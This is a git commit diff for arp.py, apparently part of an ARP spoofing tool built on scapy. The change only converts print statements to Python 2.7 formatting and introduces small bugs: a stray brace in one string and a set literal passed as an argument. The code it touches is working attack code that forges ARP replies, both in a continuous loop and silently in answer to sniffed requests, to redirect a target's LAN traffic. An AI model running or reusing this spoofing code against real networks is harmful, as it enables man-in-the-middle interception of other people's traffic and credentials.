84b50d80a627f3f87a41b1eae0e37d08f53c4e3a
wheijne <wout.heijne5@gmail.com>
2025-07-20 15:38:17 +0200

    changed print to python 2.7 format

--- arp.py
+++ arp.py
@@ -14,25 +14,25 @@ def continuous_arp_spoof(target_ip, spoofed_ip, interval):
     start a loop that continuously sends spoofing packets, interval in seconds
     """
     try:
-        print(f"starting contiuous arp spoof from {target_ip} to {spoofed_ip} with interval {interval} seconds")
+        print("starting contiuous arp spoof from %s to %s with interval %d seconds" % (target_ip, spoofed_ip, interval))
         packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
         sc.send(packet, inter=interval, loop=True)
     except KeyboardInterrupt:
-        print(f"stopping continuous ARP spoofing")
+        print("stopping continuous ARP spoofing")
 
 def silent_arp_spoof(target_ip, spoofed_ip):
-    print(f"starting silent arp spoof of {target_ip} to {spoofed_ip}")
+    print("starting silent arp spoof of %s to %s" % (target_ip, spoofed_ip))
 
     def handle_arp_packet(packet):
         if packet.haslayer(sc.ARP) and packet[sc.ARP].op == 1:
             if packet[sc.ARP].psrc == target_ip and packet[sc.ARP].pdst == spoofed_ip:
-                print(f"got arp request from {target_ip} to {spoofed_ip}")
+                print("got arp request from %s to %s}" % (target_ip, spoofed_ip))
                 send_spoof_packet(target_ip, spoofed_ip)
-                print(f"Send spoofed packet: {spoofed_ip} is at {sc.get_if_hwaddr()}")
+                print("Send spoofed packet: %s is at %s" % (spoofed_ip, sc.get_if_hwaddr()))
             elif packet[sc.ARP].psrc == spoofed_ip and packet[sc.ARP].pdst == target_ip:
-                print(f"caught arp request from {spoofed_ip} to {target_ip}, ignoring")
+                print("caught arp request from %s to %s, ignoring" % ({spoofed_ip}, target_ip))
 
     try:
         sc.sniff(filter="arp", prn=handle_arp_packet, store=0)
     except KeyboardInterrupt:
-        print(f"Stopping silent ARP spoofing")
+        print("Stopping silent ARP spoofing")
